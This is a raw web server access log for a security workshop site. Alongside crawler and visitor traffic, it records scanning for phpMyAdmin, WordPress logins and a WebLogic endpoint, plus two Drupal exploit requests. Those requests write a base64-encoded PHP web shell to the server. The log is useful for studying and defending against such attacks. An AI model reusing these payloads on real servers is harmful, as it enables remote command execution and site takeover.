www.nspw.org:80 220.181.125.142 - - [01/May/2018:20:15:32 -0400] "GET /papers/2006/nspw2006-greenwald.pdf HTTP/1.1" 302 560 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 220.181.125.142 - - [01/May/2018:20:15:32 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:15:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:20:18:28 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:20:20:29 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:20:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 88.99.27.172 - - [01/May/2018:20:22:15 -0400] "GET /papers/2011/nspw2011-friedland.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:20:22:41 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 49.195.59.53 - - [01/May/2018:20:24:09 -0400] "GET /papers/2007/nspw2007-vidyaraman.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:25:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:25 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:25 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:26 -0400] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 302 550 "-" "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:26 -0400] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 302 550 "-" "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:44 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 571 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:44 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 571 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:45 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:46 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:46 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:46 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:46 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:47 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:47 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:48 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:48 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:48 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:48 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:49 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:50 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:51 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:51 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:52 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:52 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:52 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:52 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:52 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:52 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:53 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:54 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /phpmyadmin-old/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /phpmyadmin-old/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /phpMyAdminold/index.php HTTP/1.1" 302 576 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:55 -0400] "GET /phpMyAdminold/index.php HTTP/1.1" 302 576 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:56 -0400] "GET /pma-old/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:56 -0400] "GET /pma-old/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:56 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:56 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:56 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:56 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:56 -0400] "GET /phpma/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:57 -0400] "GET /phpma/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:57 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:57 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:57 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 193.112.162.210 - - [01/May/2018:20:28:57 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:20:29:04 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:20:29:23 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 179.255.179.10 - - [01/May/2018:20:29:38 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.255.179.10 - - [01/May/2018:20:29:41 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:30:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.117 - - [01/May/2018:20:31:19 -0400] "GET /papers/1998/nspw1998-slater.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.102.6.212 - - [01/May/2018:20:31:40 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
www.nspw.org:80 180.76.15.162 - - [01/May/2018:20:33:17 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 556 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:20:33:20 -0400] "GET /2009/invite-old/papers.html HTTP/1.1" 302 583 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:35:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 111.206.52.66 - - [01/May/2018:20:37:45 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 185.244.25.162 - - [01/May/2018:20:38:58 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.19.7"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:40:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 5.196.87.138 - - [01/May/2018:20:41:32 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 54.36.149.73 - - [01/May/2018:20:41:44 -0400] "GET /2015/sponsors HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 34.231.5.82 - - [01/May/2018:20:42:04 -0400] "HEAD /papers/1994/nspw1994-limoges.pdf HTTP/1.1" 302 220 "-" "Blackboard Safeassign"
www.nspw.org:80 179.179.86.19 - - [01/May/2018:20:42:05 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.179.86.19 - - [01/May/2018:20:42:08 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 34.231.5.82 - - [01/May/2018:20:42:11 -0400] "GET /papers/1994/nspw1994-limoges.pdf HTTP/1.1" 302 556 "-" "Blackboard Safeassign"
www.nspw.org:80 177.184.64.13 - - [01/May/2018:20:43:15 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 177.184.64.13 - - [01/May/2018:20:43:18 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.151 - - [01/May/2018:20:43:40 -0400] "GET /cfp/flyer_NSPW_2014.pdf HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 146.158.170.199 - - [01/May/2018:20:45:28 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 146.158.170.199 - - [01/May/2018:20:45:30 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 123.207.95.146 - - [01/May/2018:20:45:31 -0400] "GET / HTTP/1.1" 302 492 "-" "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:45:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 41.215.163.143 - - [01/May/2018:20:46:42 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.215.163.143 - - [01/May/2018:20:46:44 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 186.233.179.7 - - [01/May/2018:20:50:10 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 186.233.179.7 - - [01/May/2018:20:50:13 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 47.54.254.242 - - [01/May/2018:20:50:28 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 47.54.254.242 - - [01/May/2018:20:50:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:50:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 207.46.13.40 - - [01/May/2018:20:52:03 -0400] "GET /2010/ HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 40.77.167.117 - - [01/May/2018:20:52:52 -0400] "GET /papers/1996/nspw1996-wulf.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 40.77.167.65 - - [01/May/2018:20:52:53 -0400] "GET /2009/proceedings/2010/nspw2010-lilien.pdf HTTP/1.1" 302 611 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 182.187.116.36 - - [01/May/2018:20:52:53 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 182.187.116.36 - - [01/May/2018:20:52:55 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 111.206.36.138 - - [01/May/2018:20:54:09 -0400] "GET / HTTP/1.1" 302 529 "http://www.baidu.com/s?wd=TAJ" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
www.nspw.org:80 ::1 - - [01/May/2018:20:54:16 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:54:17 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:54:18 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:54:26 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 213.152.54.193 - - [01/May/2018:20:54:48 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 213.152.54.193 - - [01/May/2018:20:54:49 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:55 -0400] "GET /modules/system/system.base.css?nhfa6e HTTP/1.1" 302 547 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:55 -0400] "GET /modules/system/system.menus.css?nhfa6e HTTP/1.1" 302 549 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:55 -0400] "GET /modules/system/system.messages.css?nhfa6e HTTP/1.1" 302 555 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:55 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.1" 302 549 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:57 -0400] "GET /modules/comment/comment.css?nhfa6e HTTP/1.1" 302 541 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:57 -0400] "GET /modules/field/theme/field.css?nhfa6e HTTP/1.1" 302 545 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:57 -0400] "GET /modules/user/user.css?nhfa6e HTTP/1.1" 302 529 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:57 -0400] "GET /modules/node/node.css?nhfa6e HTTP/1.1" 302 529 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
